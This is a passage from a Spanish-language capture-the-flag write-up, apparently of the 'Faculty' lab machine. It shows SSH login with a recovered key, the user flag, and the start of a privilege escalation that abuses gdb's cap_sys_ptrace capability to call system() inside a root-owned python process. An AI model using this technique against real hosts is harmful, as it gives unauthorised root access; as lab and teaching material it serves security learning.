gbyolo@faculty:/dev/shm$ chmod &lt;span class=&#34;m&#34;&gt;600&lt;/span&gt; id_rsa
gbyolo@faculty:/dev/shm$ ssh -i id_rsa developer@localhost
The authenticity of host &lt;span class=&#34;s1&#34;&gt;&amp;#39;localhost (127.0.0.1)&amp;#39;&lt;/span&gt; can&lt;span class=&#34;s1&#34;&gt;&amp;#39;t be established.
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;ECDSA key fingerprint is SHA256:EzyBEKh/AuG97K3+To2ltCrl4wjUY9qrlnj8nNuvW8U.
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Warning: Permanently added &amp;#39;&lt;/span&gt;localhost&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; to the list of known hosts.
Welcome to Ubuntu 20.04.4 LTS &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;GNU/Linux 5.4.0-121-generic x86_64&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jul &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 01:45:49 CEST &lt;span class=&#34;m&#34;&gt;2022&lt;/span&gt;

  System load:  0.0               Processes:             &lt;span class=&#34;m&#34;&gt;231&lt;/span&gt;
  Usage of /:   74.9% of 4.67GB   Users logged in:       &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
  Memory usage: 34%               IPv4 address &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; eth0: 10.10.11.169
  Swap usage:   0%


&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; updates can be applied immediately.


The list of available updates is more than a week old.
To check &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


developer@faculty:~$ whoami&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;id&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
developer
&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1001&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;developer&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1002&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;developer&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1002&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;developer&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,1001&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;debug&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,1003&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;faculty&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/home/developer
developer@faculty:~$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Logrando tambien obtener nuestra flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;developer@faculty:~$ ls
sendmail.sh  user.txt
developer@faculty:~$ cat user.txt
6c505d51049f9fb545788a5031e4e8c9
developer@faculty:~$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;privesc&#34;&gt;Privesc&lt;/h1&gt;
&lt;p&gt;Realizamos una enumeración de las capabilities en la máquina y observamos a gdb.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;developer@faculty:~$ getcap -r / 2&amp;gt;/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; cap_net_bind_service,cap_net_admin+ep
/usr/bin/gdb &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; cap_sys_ptrace+ep
/usr/bin/ping &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; cap_net_raw+ep
/usr/bin/traceroute6.iputils &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; cap_net_raw+ep
/usr/bin/mtr-packet &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; cap_net_raw+ep
developer@faculty:~$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Hacktricks menciona un ejemplo: &lt;a href=&#34;https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_ptrace&#34;&gt;Example with environment (Docker breakout) - Gdb Abuse&lt;/a&gt;, utilizando gdb para ejecutar comandos utilizando el comando &lt;code&gt;call&lt;/code&gt; en un proceso adjunto. La documentación indica que &lt;a href=&#34;https://sourceware.org/gdb/onlinedocs/gdb/Calling.html&#34;&gt;call&lt;/a&gt; permite evaluar funciones las cuales estan presentes en el programa que está siendo debugeado, en el ejemplo utiliza la funcion system() para ejecutar comandos, para ello dicha funcion debe de existir en el programa en ejecución.&lt;/p&gt;
&lt;p&gt;Listamos los procesos con &lt;code&gt;ps&lt;/code&gt;, observamos todos aquellos que son ejecutados por root.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;developer@faculty:~$ ps -ef&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep root
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.. snip ..&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
root         &lt;span class=&#34;m&#34;&gt;619&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 01:40 ?        00:00:01 /sbin/multipathd -d -s
root         &lt;span class=&#34;m&#34;&gt;659&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 01:40 ?        00:00:00 /usr/bin/VGAuthService
root         &lt;span class=&#34;m&#34;&gt;660&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 01:40 ?        00:00:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root         &lt;span class=&#34;m&#34;&gt;669&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 01:40 ?        00:00:09 /usr/bin/vmtoolsd
root         &lt;span class=&#34;m&#34;&gt;683&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 01:40 ?        00:00:00 /usr/lib/accountsservice/accounts-daemon
root         &lt;span class=&#34;m&#34;&gt;689&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 01:40 ?        00:00:00 /usr/sbin/irqbalance --foreground
root         &lt;span class=&#34;m&#34;&gt;690&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 01:40 ?        00:00:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         &lt;span class=&#34;m&#34;&gt;691&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 01:40 ?        00:00:00 /usr/lib/policykit-1/polkitd --no-debug
root         &lt;span class=&#34;m&#34;&gt;699&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 01:40 ?        00:00:00 /lib/systemd/systemd-logind
root         &lt;span class=&#34;m&#34;&gt;700&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 01:40 ?        00:00:00 /usr/lib/udisks2/udisksd
root         &lt;span class=&#34;m&#34;&gt;754&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 01:40 ?        00:00:00 /usr/sbin/ModemManager
root         &lt;span class=&#34;m&#34;&gt;928&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 01:40 ?        00:00:00 /usr/sbin/cron -f
root         &lt;span class=&#34;m&#34;&gt;929&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 01:40 ?        00:00:00 php-fpm: master process &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;/etc/php/7.4/fpm/php-fpm.conf&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
root         &lt;span class=&#34;m&#34;&gt;931&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;928&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 01:40 ?        00:00:00 /usr/sbin/CRON -f
root         &lt;span class=&#34;m&#34;&gt;940&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;931&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 01:40 ?        00:00:00 /bin/sh -c bash /root/service_check.sh
root         &lt;span class=&#34;m&#34;&gt;941&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;940&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 01:40 ?        00:00:00 bash /root/service_check.sh
root         &lt;span class=&#34;m&#34;&gt;946&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 01:40 ?        00:00:00 nginx: master process /usr/sbin/nginx -g daemon on&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; master_process on&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
root         &lt;span class=&#34;m&#34;&gt;957&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 01:40 ?        00:00:00 sshd: /usr/sbin/sshd -D &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;listener&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; of 10-100 startups
root         &lt;span class=&#34;m&#34;&gt;982&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 01:40 tty1     00:00:00 /sbin/agetty -o -p -- &lt;span class=&#34;se&#34;&gt;\u&lt;/span&gt; --noclear tty1 linux
root        &lt;span class=&#34;m&#34;&gt;1567&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 01:40 ?        00:00:00 /usr/lib/postfix/sbin/master -w
root        &lt;span class=&#34;m&#34;&gt;1610&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;957&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 01:40 ?        00:00:00 sshd: gbyolo &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;priv&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
root        &lt;span class=&#34;m&#34;&gt;1995&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;957&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 01:45 ?        00:00:00 sshd: developer &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;priv&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
root        &lt;span class=&#34;m&#34;&gt;3708&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 02:33 ?        00:00:01 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;kworker/0:1-events&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
root        &lt;span class=&#34;m&#34;&gt;5104&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 03:13 ?        00:00:01 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;kworker/1:2-events&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
root        &lt;span class=&#34;m&#34;&gt;5736&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 03:35 ?        00:00:00 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;kworker/u256:3-events_unbound&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
root        &lt;span class=&#34;m&#34;&gt;5808&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 03:39 ?        00:00:01 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;kworker/0:0-events&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
root        &lt;span class=&#34;m&#34;&gt;5868&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 03:39 ?        00:00:00 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;kworker/1:0-rcu_par_gp&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
root        &lt;span class=&#34;m&#34;&gt;6463&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 03:58 ?        00:00:00 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;kworker/u256:0-events_unbound&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
root        &lt;span class=&#34;m&#34;&gt;6678&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 04:04 ?        00:00:00 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;kworker/u256:1-events_unbound&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
root        &lt;span class=&#34;m&#34;&gt;6839&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 04:09 ?        00:00:00 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;kworker/1:1-events&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
root        &lt;span class=&#34;m&#34;&gt;6870&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;941&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 04:09 ?        00:00:00 sleep &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt;
develop+    &lt;span class=&#34;m&#34;&gt;6913&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;2093&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 04:09 pts/1    00:00:00 grep --color&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;auto root
developer@faculty:~$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Despues de listar las funciones de algunos procesos con gdb encontramos que en el proceso ejecutado por python existe la función &lt;code&gt;system()&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;developer@faculty:~$ gdb -p &lt;span class=&#34;m&#34;&gt;690&lt;/span&gt; -q
Attaching to process &lt;span class=&#34;m&#34;&gt;690&lt;/span&gt;
Reading symbols from /usr/bin/python3.8...
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.. snip ..&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
0x00007f5077df8967 in __GI___poll &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;fds&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0x1d01a60, &lt;span class=&#34;nv&#34;&gt;nfds&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;3, &lt;span class=&#34;nv&#34;&gt;timeout&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at ../sysdeps/unix/sysv/linux/poll.c:29
&lt;span class=&#34;m&#34;&gt;29&lt;/span&gt;  ../sysdeps/unix/sysv/linux/poll.c: No such file or directory.
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; info functions system
All functions matching regular expression &lt;span class=&#34;s2&#34;&gt;&amp;#34;system&amp;#34;&lt;/span&gt;:

File ../sysdeps/posix/system.c:
197:    int __libc_system&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;const char *&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
102:    static int do_system&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;const char *&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

File pt-system.c:
38: static int system_compat&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;const char *&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

File svc.c:
309:    void __GI_svcerr_systemerr&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SVCXPRT *&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

Non-debugging symbols:
0x0000000000425530  system@plt                          &lt;span class=&#34;c1&#34;&gt;# &amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;------------------&lt;/span&gt;
0x00007f5077cc96e0  __libc_system@plt
0x00007f5077577180  g_mem_is_system_malloc
0x00007f50775a8d60  g_get_system_data_dirs
0x00007f50775a8de0  g_get_system_config_dirs
0x00007f5077263bf0  g_get_system_config_dirs@plt
0x00007f5077263c40  g_get_system_data_dirs@plt
0x00007f5077266c10  g_filesystem_preview_type_get_type
0x00007f507728c060  g_file_query_filesystem_info
0x00007f507728c1f0  g_file_query_filesystem_info_async
0x00007f507728c2b0  g_file_query_filesystem_info_finish
0x00007f50772b3450  g_mount_operation_get_is_tcrypt_system_volume
0x00007f50772b34b0  g_mount_operation_set_is_tcrypt_system_volume
0x00007f50772e3740  g_tls_connection_set_use_system_certdb
0x00007f50772e37d0  g_tls_connection_get_use_system_certdb
0x00007f50772ff1e0  g_unix_is_mount_path_system_internal
0x00007f50772ff2a0  g_unix_is_system_fs_type
0x00007f50772ff340  g_unix_is_system_device_path
0x00007f50773001f0  g_unix_mount_is_system_internal
0x00007f50771e7610  mnt_guess_system_root
0x00007f50771b4520  selinux_systemd_contexts_path
0x00007f5076f64b50  _dbus_init_system_log
0x00007f5076f659c0  _dbus_user_database_lock_system
0x00007f5076f659e0  _dbus_user_database_unlock_system
